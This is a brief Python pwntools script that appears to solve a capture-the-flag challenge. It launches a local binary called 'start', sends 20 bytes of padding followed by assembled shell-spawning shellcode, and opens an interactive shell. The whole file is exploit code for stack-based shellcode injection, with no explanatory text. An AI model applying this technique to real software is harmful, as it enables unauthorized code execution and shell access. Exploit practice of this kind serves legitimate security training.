from pwn import *

sh = process('./start')

payload = asm(shellcraft.sh())
print payload

sh.sendline('a'*20 + payload)

sh.interactive()
